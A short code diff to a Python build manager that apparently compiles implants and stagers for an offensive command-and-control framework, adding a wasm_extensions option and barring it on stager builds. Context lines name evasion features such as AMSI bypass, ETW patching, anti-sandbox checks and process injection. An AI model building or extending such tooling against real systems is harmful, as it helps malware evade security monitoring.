@@ -387,6 +387,15 @@ class BuildManager:
             if params.get('use_mtls'):
                 raise RuntimeError(
                     "stager does not support mTLS")
+            if params.get('wasm_extensions'):
+                raise RuntimeError(
+                    "stager builds do not support wasm_extensions. "
+                    "The stager is a minimal first stage with no "
+                    "extension host — the feature gates a Cargo "
+                    "dependency that would triple the stager's "
+                    "size for no benefit. Leave wasm_extensions="
+                    "false on the stager, and enable it on the "
+                    "full agent the stager fetches.")
             if fmt == 'dll':
                 raise RuntimeError(
                     "output_format='dll' cannot be a stager")
@@ -489,6 +498,8 @@ class BuildManager:
         cfg.inject_method = (
             params.get('inject_method') or 'default')
         cfg.identity_role = params.get('identity_role') or ''
+        cfg.wasm_extensions = bool(
+            params.get('wasm_extensions', False))
 
         ALLOWED_OVERRIDES = frozenset({
             'antisanbox', 'amsi_bypass', 'etw_patch',
